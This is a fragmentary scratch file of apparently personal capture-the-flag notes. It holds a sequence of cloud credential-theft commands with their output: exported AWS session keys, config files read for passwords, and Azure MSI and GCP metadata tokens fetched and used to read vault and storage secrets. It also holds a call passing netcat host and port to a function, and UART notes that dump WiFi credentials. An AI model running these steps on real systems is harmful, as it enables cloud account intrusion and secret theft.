@@ -1,0 +1,485 @@
+facebook? SFRIe3MwY2
+
+youtube RjazNyc30=
+
+linkedin a3c0cmRfaD
+
+twitter k0bGx5XzR3 
+
+
+
+1:SFRIe3MwY2
+2:k0bGx5XzR3
+3:a3c0cmRfaD
+4:RjazNyc30=
+
+
+SFRIe3MwY2k0bGx5XzR3a3c0cmRfaDRjazNyc30=
+
+
+skull
+{
+    "user": "super_admin",
+    "time": "Thu Nov 03 2022 16:19:43 GMT+0000 (Coordinated Universal Time)",
+    "userId": 12,
+    "iat": 1667492383
+}
+
+
+{
+    "user": "super_admin",
+    "time": "Thu Nov 03 2022 16:19:43 GMT+0000 (Coordinated Universal Time)",
+    "userId": 12,
+    "iat": 1667492383
+}
+
+
+
+ship
+{
+    "user": "super_admin",
+    "time": "Thu Nov 03 2022 16:19:37 GMT+0000 (Coordinated Universal Time)",
+    "userId": 12,
+    "iat": 1667492377
+}
+
+
+
+let cookieValue = document.cookie
+    .split(';')
+    .find((row) => row.startsWith('user='))
+    ?.split('=')[1];
+    const value = 'aGFja2luZ19pc19mdW4';
+    if (cookieValue === value){
+        passWord = true;
+    }
+    
+    
+
+
+crypto challange answer to problem is when is the next taco tuesday
+
+
+
+export AWS_ACCESS_KEY_ID=ASIAWFPTUW2CPUD5KKU6
+    
+export AWS_SECRET_ACCESS_KEY=WfLVT5+/ar7JEzeP5F3WLKe7JQhbxDYXkKfciqRc
+
+export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjENr//////////wEaCXVzLWVhc3QtMSJIMEYCIQD0iALGl67bx/jMGLb3UCBSP+z2Gy2Nc/vGo6xidhnowwIhAN/MmMjtc4AXT9DoQhOL+c8fPmV0ZHiR4bkJ1QG4SUSZKqYDCMP//////////wEQABoMNDI0MTAyMTE0OTQ4IgyIQqytxSNxW7qeKnIq+gKQH+VClDvUHSZeNUH0D9pbE+dQ2MulyiD3P70u//KSCr73gGcVgB16i9GlqLf7BYDFZi/wK0ITbaCKv2uySttaKIxSNAIQxVWo7JnSKEIrO0I1+W04yyyw9wLW88ATFnMA3WakygiArnvXyRs0APxqeg3WXb+Hmkrcrg1i8GlpBIfRqG2l7NEEqX9FoRNiLYca+uPs71NpKNPLlWCU7GdqR+D4Oa/y7XGGinFKw3MA0nFpaM8D92or0PW3UPmHjn28v7815C5nkJNiALy8m2gMsF9/7M5goWoJEbgN9RY6dJ2uGCqnKuQxeUcHb+/u8WcZpXSqNhpZOgb4tKdaKu8vKgHxXRdiX0UWs8mr1PXp2HbSjHXDubDr8Uyx/lo/gNFpQjjThXasg510YaREOjzi9GyK1c9rlFqj8/I987VgT1awHk8TGbKySiV7C2vctcXZQk2Vbp0k1BOPI6eAfHozOua18PiLicsRmw85Zu/glgY0/XxmeNPEOo4w8/6PmwY6nAFVyhamLT0ZIcdfaLyGrzLy+olpGJYXgTXX7e8Y/iWprMXhMeFMNNXXI1jOp/oa7VIJ+amjkE+WsG+fDdd+gKyLrP88nKKqewo8TuFgHcmMZEPqvOyuMozPpxYctqfHChz3NBNQPG7pSC7x1+PxsoxFNd4ivvevqyyzttJ4rhuX9YxDUXmXAbVw7DEEjc8IN9CRqfX8VcFEP52l0Lk=
+
+export AWS_REGION=us-east-1
+
+PANTHER_SECRET_ARN=arn:aws:secretsmanager:us-east-1:424102114948:secret:panther-3649deb9-9100-97b4-a4cc-15c5791a17e0-Iv6itT
+
+    
+{
+    "UserId": "AROAWFPTUW2CLID4TRYUR:serverless-prey-panther-4259ab66c461",
+    "Account": "424102114948",
+    "Arn": "arn:aws:sts::424102114948:assumed-role/panther-lambda-4259ab66c461-role/serverless-prey-panther-4259ab66c461"
+}
+
+
+cat /var/task/config.json
+{
+    "database": {
+        "user": "panther_user",
+        "pass": "HTH{71df7e49-97ef-9f2a-e50e-d894394bbd85}"
+    },
+    "storage": {
+        "bucket": "panther-gupbdrir",
+        "object": "panther.jpg"
+    }
+
+
+
+KET --key panther.jpg ~/Downloads/panther.jpg
+{
+    "AcceptRanges": "bytes",
+    "LastModified": "2022-10-11T23:14:09+00:00",
+    "ContentLength": 232424,
+    "ETag": "\"5902226f4cdda19c04af3b0fae1ba7ea\"",
+    "ContentType": "binary/octet-stream",
+    "Metadata": {},
+    "TagCount": 1
+}
+
+
+
+
+
+
+
+
+ export COUGAR_STORAGE_ACCOUNT="cougar4xwzvesl"
+
+ cat /home/site/wwwroot/appsettings.json
+{
+    "ConnectionStrings": {
+        "DefaultConnection": "Server=10.42.42.42:8000;uid=cougar_user;pwd=HTH{428f3091-667e-bd63-89a2-5a4ba9d6bc3a}"
+    },
+    "Storage" : {
+        "account" : "cougar4xwzvesl",
+        "container" : "assets",
+        "blob" : "cougar.jpg"
+    }
+
+
+
+MSI_ENDPOINT=http://localhost:8081/msi/token
+MSI_SECRET=441E54B031074AA9B303518FCED3CCB0
+
+COUGAR_KEY_VAULT_URL=https://cougar6ule93m8.vault.azure.net/
+COUGAR_SECRET_NAME=cougar-0dbdda8f-7eb5-b2a1-47d4-3271032bf969
+
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiJodHRwczovL3N0b3JhZ2UuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJiOGI0MzM0LTk2MjAtNDkwZS04MThkLWIyN2Q5NzQ5OGJlYy8iLCJpYXQiOjE2Njc1MDAwMjAsIm5iZiI6MTY2NzUwMDAyMCwiZXhwIjoxNjY3NTg2NzIwLCJhaW8iOiJFMlpnWU1oNHNycjVpZENVcGZzejFhWVZNbjg3QmdBPSIsImFwcGlkIjoiMzRiMWRiZTItYzk4Mi00YTg2LTg3MmMtM2Q2MDg3NDVjNWNjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjLyIsIm9pZCI6IjM3OTBhNGU2LTg1MjUtNDk4YS05YTg4LTZjYmJlZmFhMWM2OSIsInJoIjoiMC5BVVlBTkVPTEt5Q1dEa21CamJKOWwwbUw3SUdtQnVUVTg2aENrTGJDc0NsSmV2R0FBQUEuIiwic3ViIjoiMzc5MGE0ZTYtODUyNS00OThhLTlhODgtNmNiYmVmYWExYzY5IiwidGlkIjoiMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjIiwidXRpIjoiRVN3LXc4QkFzRWFQMFJpSVBVaVhBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzgzNjE5MDAzLWU1NDctNDg3Ni04MmY5LTFkYTkyNDlmOGZmMi9yZXNvdXJjZWdyb3Vwcy9zZXJ2ZXJsZXNzLXByZXktY291Z2FyLTUwNGNjYTg2YWUvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvY291Z2FyNTA0Y2NhODZhZSJ9.UV9Yj-EodmNgOUX9lIh_hN5VU2PBu-xm3n6tqGJ-GfHs7hTr2Zva7TvFiHr6Ul0eIAYaKHQ4iUuaJ9LFw9m25_1cVnzv7qhY2E2OU1geNkilVtw0xStujpqPEDpUlg4JohvJxo4IoOuN6y31rvZyBda6aquVg5Q9csjxfJTgoZ0TC9Yf0E_lRAdBpfWPexuSTDdkp4PgJH3TcC3wAtuNNWhauCloiOjUouX4vC9CTrIyfHEyeknFUNaf0bQmZ9QFox4RJDgJ1BC6uvwbExI74IvLpk3kicr77YAi3vG2dwfiE-d_hAv9Z-o2rImleYkt7lvilNlogy_rzWp17o7XoQ","expires_on":"11/04/2022 18:31:59 +00:00","resource":"https://storage.azure.com/","token_type":"Bearer","client_id":"34b1dbe2-c982-4a86-872c-3d608745c5cc"}
+
+ curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/" && echo
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiJodHRwczovL3N0b3JhZ2UuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJiOGI0MzM0LTk2MjAtNDkwZS04MThkLWIyN2Q5NzQ5OGJlYy8iLCJpYXQiOjE2Njc1MDAwMjAsIm5iZiI6MTY2NzUwMDAyMCwiZXhwIjoxNjY3NTg2NzIwLCJhaW8iOiJFMlpnWU1oNHNycjVpZENVcGZzejFhWVZNbjg3QmdBPSIsImFwcGlkIjoiMzRiMWRiZTItYzk4Mi00YTg2LTg3MmMtM2Q2MDg3NDVjNWNjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjLyIsIm9pZCI6IjM3OTBhNGU2LTg1MjUtNDk4YS05YTg4LTZjYmJlZmFhMWM2OSIsInJoIjoiMC5BVVlBTkVPTEt5Q1dEa21CamJKOWwwbUw3SUdtQnVUVTg2aENrTGJDc0NsSmV2R0FBQUEuIiwic3ViIjoiMzc5MGE0ZTYtODUyNS00OThhLTlhODgtNmNiYmVmYWExYzY5IiwidGlkIjoiMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjIiwidXRpIjoiRVN3LXc4QkFzRWFQMFJpSVBVaVhBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzgzNjE5MDAzLWU1NDctNDg3Ni04MmY5LTFkYTkyNDlmOGZmMi9yZXNvdXJjZWdyb3Vwcy9zZXJ2ZXJsZXNzLXByZXktY291Z2FyLTUwNGNjYTg2YWUvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvY291Z2FyNTA0Y2NhODZhZSJ9.UV9Yj-EodmNgOUX9lIh_hN5VU2PBu-xm3n6tqGJ-GfHs7hTr2Zva7TvFiHr6Ul0eIAYaKHQ4iUuaJ9LFw9m25_1cVnzv7qhY2E2OU1geNkilVtw0xStujpqPEDpUlg4JohvJxo4IoOuN6y31rvZyBda6aquVg5Q9csjxfJTgoZ0TC9Yf0E_lRAdBpfWPexuSTDdkp4PgJH3TcC3wAtuNNWhauCloiOjUouX4vC9CTrIyfHEyeknFUNaf0bQmZ9QFox4RJDgJ1BC6uvwbExI74IvLpk3kicr77YAi3vG2dwfiE-d_hAv9Z-o2rImleYkt7lvilNlogy_rzWp17o7XoQ","expires_on":"11/04/2022 18:31:59 +00:00","resource":"https://storage.azure.com/","token_type":"Bearer","client_id":"34b1dbe2-c982-4a86-872c-3d608745c5cc"}
+
+
+ curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net" && echo
+{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJiOGI0MzM0LTk2MjAtNDkwZS04MThkLWIyN2Q5NzQ5OGJlYy8iLCJpYXQiOjE2Njc0OTk5NDksIm5iZiI6MTY2NzQ5OTk0OSwiZXhwIjoxNjY3NTg2NjQ5LCJhaW8iOiJFMlpnWUZoeTh1dlNVbTJKMFBXaEMyTmZmRTdSQVFBPSIsImFwcGlkIjoiMzRiMWRiZTItYzk4Mi00YTg2LTg3MmMtM2Q2MDg3NDVjNWNjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjLyIsIm9pZCI6IjM3OTBhNGU2LTg1MjUtNDk4YS05YTg4LTZjYmJlZmFhMWM2OSIsInJoIjoiMC5BVVlBTkVPTEt5Q1dEa21CamJKOWwwbUw3RG16cU0taWdocEhvOGtQd0w1NlFKT0FBQUEuIiwic3ViIjoiMzc5MGE0ZTYtODUyNS00OThhLTlhODgtNmNiYmVmYWExYzY5IiwidGlkIjoiMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjIiwidXRpIjoiODZTLVhWcHZQa3lJYTVLclNLVjhBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzgzNjE5MDAzLWU1NDctNDg3Ni04MmY5LTFkYTkyNDlmOGZmMi9yZXNvdXJjZWdyb3Vwcy9zZXJ2ZXJsZXNzLXByZXktY291Z2FyLTUwNGNjYTg2YWUvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvY291Z2FyNTA0Y2NhODZhZSJ9.SuFsBUv69yNymabI2W_-PKw_JZaYXOaQQrZh5MFAAjH1MHV--6soZ2O9D7voAO9nhtN8KhCNJiBn8jGPhRVVGVK5L8OJQ1Zoka1jk2RWk7cMUF1cLvl62NSXO7ZCX_Yj1R_o4gi99EiTW3JDTn93pvpGHyed_ApzvEbAe6dbSRgCFse6NPRaXny71glfwsl5lUVCI5PeSCnyRw_VZ-QG_y1Epl8n0C0j7dD00ehobv8aobasZ3DRAh7Tw0l1H2eEtou8RSIldVDhz7YX7X2V5YSwS9z3_wxj82xr3yl10em-Xl2Ydp8BsnHkpqIFGJtU9uBMQTECxZ-L1H8SMZ6xMQ","expires_on":"11/04/2022 18:30:48 +00:00","resource":"https://vault.azure.net","token_type":"Bearer","client_id":"34b1dbe2-c982-4a86-872c-3d608745c5cc"}
+
+
+
+
+
+
+
+ export AZURE_STORAGE_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiJodHRwczovL3N0b3JhZ2UuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJiOGI0MzM0LTk2MjAtNDkwZS04MThkLWIyN2Q5NzQ5OGJlYy8iLCJpYXQiOjE2Njc1MDAwMjAsIm5iZiI6MTY2NzUwMDAyMCwiZXhwIjoxNjY3NTg2NzIwLCJhaW8iOiJFMlpnWU1oNHNycjVpZENVcGZzejFhWVZNbjg3QmdBPSIsImFwcGlkIjoiMzRiMWRiZTItYzk4Mi00YTg2LTg3MmMtM2Q2MDg3NDVjNWNjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjLyIsIm9pZCI6IjM3OTBhNGU2LTg1MjUtNDk4YS05YTg4LTZjYmJlZmFhMWM2OSIsInJoIjoiMC5BVVlBTkVPTEt5Q1dEa21CamJKOWwwbUw3SUdtQnVUVTg2aENrTGJDc0NsSmV2R0FBQUEuIiwic3ViIjoiMzc5MGE0ZTYtODUyNS00OThhLTlhODgtNmNiYmVmYWExYzY5IiwidGlkIjoiMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjIiwidXRpIjoiRVN3LXc4QkFzRWFQMFJpSVBVaVhBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzgzNjE5MDAzLWU1NDctNDg3Ni04MmY5LTFkYTkyNDlmOGZmMi9yZXNvdXJjZWdyb3Vwcy9zZXJ2ZXJsZXNzLXByZXktY291Z2FyLTUwNGNjYTg2YWUvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvY291Z2FyNTA0Y2NhODZhZSJ9.UV9Yj-EodmNgOUX9lIh_hN5VU2PBu-xm3n6tqGJ-GfHs7hTr2Zva7TvFiHr6Ul0eIAYaKHQ4iUuaJ9LFw9m25_1cVnzv7qhY2E2OU1geNkilVtw0xStujpqPEDpUlg4JohvJxo4IoOuN6y31rvZyBda6aquVg5Q9csjxfJTgoZ0TC9Yf0E_lRAdBpfWPexuSTDdkp4PgJH3TcC3wAtuNNWhauCloiOjUouX4vC9CTrIyfHEyeknFUNaf0bQmZ9QFox4RJDgJ1BC6uvwbExI74IvLpk3kicr77YAi3vG2dwfiE-d_hAv9Z-o2rImleYkt7lvilNlogy_rzWp17o7XoQ"
+ export AZURE_VAULT_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJiOGI0MzM0LTk2MjAtNDkwZS04MThkLWIyN2Q5NzQ5OGJlYy8iLCJpYXQiOjE2Njc0OTk5NDksIm5iZiI6MTY2NzQ5OTk0OSwiZXhwIjoxNjY3NTg2NjQ5LCJhaW8iOiJFMlpnWUZoeTh1dlNVbTJKMFBXaEMyTmZmRTdSQVFBPSIsImFwcGlkIjoiMzRiMWRiZTItYzk4Mi00YTg2LTg3MmMtM2Q2MDg3NDVjNWNjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjLyIsIm9pZCI6IjM3OTBhNGU2LTg1MjUtNDk4YS05YTg4LTZjYmJlZmFhMWM2OSIsInJoIjoiMC5BVVlBTkVPTEt5Q1dEa21CamJKOWwwbUw3RG16cU0taWdocEhvOGtQd0w1NlFKT0FBQUEuIiwic3ViIjoiMzc5MGE0ZTYtODUyNS00OThhLTlhODgtNmNiYmVmYWExYzY5IiwidGlkIjoiMmI4YjQzMzQtOTYyMC00OTBlLTgxOGQtYjI3ZDk3NDk4YmVjIiwidXRpIjoiODZTLVhWcHZQa3lJYTVLclNLVjhBQSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zLzgzNjE5MDAzLWU1NDctNDg3Ni04MmY5LTFkYTkyNDlmOGZmMi9yZXNvdXJjZWdyb3Vwcy9zZXJ2ZXJsZXNzLXByZXktY291Z2FyLTUwNGNjYTg2YWUvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvY291Z2FyNTA0Y2NhODZhZSJ9.SuFsBUv69yNymabI2W_-PKw_JZaYXOaQQrZh5MFAAjH1MHV--6soZ2O9D7voAO9nhtN8KhCNJiBn8jGPhRVVGVK5L8OJQ1Zoka1jk2RWk7cMUF1cLvl62NSXO7ZCX_Yj1R_o4gi99EiTW3JDTn93pvpGHyed_ApzvEbAe6dbSRgCFse6NPRaXny71glfwsl5lUVCI5PeSCnyRw_VZ-QG_y1Epl8n0C0j7dD00ehobv8aobasZ3DRAh7Tw0l1H2eEtou8RSIldVDhz7YX7X2V5YSwS9z3_wxj82xr3yl10em-Xl2Ydp8BsnHkpqIFGJtU9uBMQTECxZ-L1H8SMZ6xMQ"
+ export COUGAR_KEY_VAULT_URL="https://cougar6ule93m8.vault.azure.net/"
+ export COUGAR_SECRET_NAME="cougar-0dbdda8f-7eb5-b2a1-47d4-3271032bf969"
+
+
+
+
+VAULT_TOKEN" "${COUGAR_KEY_VAULT_URL}secrets/$COUGAR_SECRET_NAME?api-version=7.0" | jq
+{
+  "value": "HTH{eed15a35-7095-85c8-0ecf-357f39e41e8f}",
+  "contentType": "",
+  "id": "https://cougar6ule93m8.vault.azure.net/secrets/cougar-0dbdda8f-7eb5-b2a1-47d4-3271032bf969/554d93d952954f03a9d6aa12384dec6b",
+  "attributes": {
+    "enabled": true,
+    "created": 1665526885,
+    "updated": 1665526885,
+    "recoveryLevel": "Recoverable+Purgeable"
+  },
+  "tags": {}
+}
+
+
+
+
+
+
+
+katiework@katiework-HP-ZBook-15-G5:~$  curl -s -H "Authorization: Bearer $AZURE_VAULT_TOKEN" "${COUGAR_KEY_VAULT_URL}secrets/$COUGAR_SECRET_NAME?api-version=7.0" | jq
+{
+  "value": "HTH{eed15a35-7095-85c8-0ecf-357f39e41e8f}",
+  "contentType": "",
+  "id": "https://cougar6ule93m8.vault.azure.net/secrets/cougar-0dbdda8f-7eb5-b2a1-47d4-3271032bf969/554d93d952954f03a9d6aa12384dec6b",
+  "attributes": {
+    "enabled": true,
+    "created": 1665526885,
+    "updated": 1665526885,
+    "recoveryLevel": "Recoverable+Purgeable"
+  },
+  "tags": {}
+}
+katiework@katiework-HP-ZBook-15-G5:~$ export COUGAR_STORAGE_ACCOUNT="cougar4xwzvesl"
+katiework@katiework-HP-ZBook-15-G5:~$ curl --head -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $AZURE_STORAGE_TOKEN" "https://$COUGAR_STORAGE_ACCOUNT.blob.core.windows.net/assets/cougar.jpg"
+HTTP/1.1 200 OK
+Content-Length: 47081
+Content-Type: application/octet-stream
+Last-Modified: Tue, 11 Oct 2022 22:18:47 GMT
+Accept-Ranges: bytes
+ETag: "0x8DAABD6913CCF80"
+Server: Windows-Azure-Blob/1.0 Microsoft-HTTPAPI/2.0
+x-ms-request-id: cdf1f881-301e-0007-74b4-efc05e000000
+x-ms-version: 2017-11-09
+x-ms-meta-Flag: HTH{97362bdd-3a2a-c18e-56fb-499d861e0b4b}
+x-ms-creation-time: Tue, 11 Oct 2022 22:18:46 GMT
+x-ms-lease-status: unlocked
+x-ms-lease-state: available
+x-ms-blob-type: BlockBlob
+x-ms-server-encrypted: true
+x-ms-access-tier: Hot
+x-ms-access-tier-inferred: true
+Date: Thu, 03 Nov 2022 18:42:49 GMT
+
+
+
+
+
+ curl -H "X-API-Key: $CHEETAH_API_KEY" "$CHEETAH_FUNCTION_URL?host=$NC_HOST&port=$NC_PORT"
+ 
+ 
+
+# Server configurations
+server:
+  host: "10.42.42.42"
+  port: 8000
+
+# Database credentials
+database:
+  user: "cheetah_user"
+  pass: "HTH{f43d136b-7bbf-a5a4-f414-481071e83f0e}"
+
+# Storage bucket
+gcs:
+  bucket: "cheetah-1c504e5f-dfa9-f266-4cb7-7a6d2f521e09"
+  object: "cheetah.jpg"
+  
+  
+  
+
+CHEETAH_SECRET_NAME=cheetah-c5afe051-dc0e-34e0-df4d-b65be7bd6e7b
+
+CHEETAH_PROJECT_ID=hth-2022-nov
+
+
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+{"access_token":"ya29.c.b0AUFJQsHZezDEkdmu2YPp1r4lvRlT0PPbZZ0VvBFqWz-07o0VYYQ8WYhDc1ckNniBaAUE8pW6yci0HfBlsw1Y9rkelD33wgZ0dC0lPWchwOdllR3p4UFYL5iHsfT4941CwimqhNFTfEf3FjhBgBixuZrvkyXzcZnzUVawaBptQp7GU3Y9aEVWkBJXvmCYfSnNYIf-PQquJpDiZGj1mF-RYLwyuRi0IcJjSHQnf0HKxGl-cKmv_Eey5oWJ7BegidZsEJr4bIepxycKPv9a9pfxi821-Lg-uuU02W1LlLPTw1QxUkVWYi9F5XwZ...............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................","expires_in":1799,"token_type":"Bearer"}
+
+
+
+
+
+ export GCP_TOKEN="ya29.c.b0AUFJQsHZezDEkdmu2YPp1r4lvRlT0PPbZZ0VvBFqWz-07o0VYYQ8WYhDc1ckNniBaAUE8pW6yci0HfBlsw1Y9rkelD33wgZ0dC0lPWchwOdllR3p4UFYL5iHsfT4941CwimqhNFTfEf3FjhBgBixuZrvkyXzcZnzUVawaBptQp7GU3Y9aEVWkBJXvmCYfSnNYIf-PQquJpDiZGj1mF-RYLwyuRi0IcJjSHQnf0HKxGl-cKmv_Eey5oWJ7BegidZsEJr4bIepxycKPv9a9pfxi821-Lg-uuU02W1LlLPTw1QxUkVWYi9F5XwZ..............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................."
+ export CHEETAH_PROJECT_ID="hth-2022-nov"
+ export CHEETAH_SECRET_NAME="cheetah-c5afe051-dc0e-34e0-df4d-b65be7bd6e7b"
+
+
+curl -s -H "Authorization: Bearer $GCP_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$CHEETAH_PROJECT_ID/secrets/$CHEETAH_SECRET_NAME/versions/latest:access | jq
+{
+  "name": "projects/686268255297/secrets/cheetah-c5afe051-dc0e-34e0-df4d-b65be7bd6e7b/versions/1",
+  "payload": {
+    "data": "SFRIezE4OTcwMTZjLWVhNGYtMTA4YS1mODM2LWI1YWFmOGQyYzE3Yn0="
+  }
+}
+
+
+
+ export GCP_BUCKET="cheetah-1c504e5f-dfa9-f266-4cb7-7a6d2f521e09"
+
+
+time_continues
+time_counts_wishes
+time_controls_
+HTH{time_ca}
+
+
+
+
+kali
+2 HTH{rtfm}
+3 HTH{listin_files}
+4 HTH{i_see_hidden_files}
+5 HTH{listin_secrets} 
+6 HTH{reading_files_like_pro}
+7 HTH{i_see_file_formats}
+8 HTH{existential_ctf_challenges} 
+
+
+
+time brings wishes
+
+taking it all back
+
+time will bring 
+
+000
+
+
+
+
+
+
+
+
+
+
+
+
+esp-wroom-02d
+
+datasheet
+
+https://www.espressif.com/sites/default/files/documentation/esp-wroom-02u_esp-wroom-02d_datasheet_en.pdf
+
+
+io0 gipo 0 
+take to grownd during power up
+
+es
+
+
+use to read and write firtmware
+
+uart 
+
+esptool
+
+
+ftdi device
+
+
+
+
+
+
+    
+    21
+    
+    
+    19
+    
+    
+    
+    only_time_will_tell
+    
+    this is not my wish
+    
+    taking it all back 
+    
+    time_will set free
+    
+    time will male right
+    
+    direction 2&3 are cookie manipuation
+    6th directory triverse 
+    
+    
+192.168.4.2 dev wlp0s20f3 lladdr c8:e2:65:c3:34:49 STALE
+192.168.4.1 dev wlp0s20f3 lladdr ca:c9:a3:4a:2e:14 REACHABLE
+fe80::895d:3c47:21fe:85f0 dev wlp0s20f3 lladdr c8:e2:65:c3:34:49 STALE
+
+    
+    
+    
+    HTH{ROBOTS_VS_PIRATES}
+    HTH{S0CK3T_INSP3CTION}
+    HTH{SLOTH_LIKES_ROCKY_ROAD}
+    HTH{CONSOLE_LOOT}
+    
+    
+    User-agent: *
+Disallow: /data
+Disallow: /messageinabottle
+Disallow: HTH{R0B0TS_VS_P1RATES}
+    
+katiework@katiework-HP-ZBook-15-G5:/dev$ ttyUSB0
+ttyUSB0: command not found
+katiework@katiework-HP-ZBook-15-G5:/dev$ /ttyUSB0
+bash: /ttyUSB0: No such file or directory
+katiework@katiework-HP-ZBook-15-G5:/dev$ cd
+katiework@katiework-HP-ZBook-15-G5:~$ ls /dev/ttyUSB0
+/dev/ttyUSB0
+katiework@katiework-HP-ZBook-15-G5:~$ picocom
+No port given
+Run with '--help'.
+katiework@katiework-HP-ZBook-15-G5:~$ picocom /dev/ttyUSB0
+picocom v3.1
+
+port is        : /dev/ttyUSB0
+flowcontrol    : none
+baudrate is    : 9600
+parity is      : none
+databits are   : 8
+stopbits are   : 1
+escape is      : C-a
+local echo is  : no
+noinit is      : no
+noreset is     : no
+hangup is      : no
+nolock is      : no
+send_cmd is    : sz -vv
+receive_cmd is : rz -vv -E
+imap is        : 
+omap is        : 
+emap is        : crcrlf,delbs,
+logfile is     : none
+initstring     : none
+exit_after is  : not set
+exit is        : no
+
+Type [C-a] [C-h] to see available commands
+Terminal ready
+
+Terminating...
+Thanks for using picocom
+katiework@katiework-HP-ZBook-15-G5:~$ picocom /dev/ttyUSB0 -b 115200
+picocom v3.1
+
+port is        : /dev/ttyUSB0
+flowcontrol    : none
+baudrate is    : 115200
+parity is      : none
+databits are   : 8
+stopbits are   : 1
+escape is      : C-a
+local echo is  : no
+noinit is      : no
+noreset is     : no
+hangup is      : no
+nolock is      : no
+send_cmd is    : sz -vv
+receive_cmd is : rz -vv -E
+imap is        : 
+omap is        : 
+emap is        : crcrlf,delbs,
+logfile is     : none
+initstring     : none
+exit_after is  : not set
+exit is        : no
+
+Type [C-a] [C-h] to see available commands
+Terminal ready
+1
+1
+0
+0
+0
+0
+0
+0
+0
+WiFi SSID: SkeletonKey-53
+Wifi Password: oneeyedwilly136
+Goonies Network Established...
+192.168.4.1
+MDNS responder started
+HTTP server started
+WebSocket started
+
+
+
+
+
+.... .- ..(.-) .- --- -. -.- 
+
+H A I A O N K
+    
+    
+    
+    
+    
+    
+... .-.. .---- -. -..
+
+.../.-../.-.../../.   
+    
+    
+    
+    
+  .../.-../.----/-./-..-/
+  
+  H L I 1 N X
+
+
+
+    
+    
+    
+    
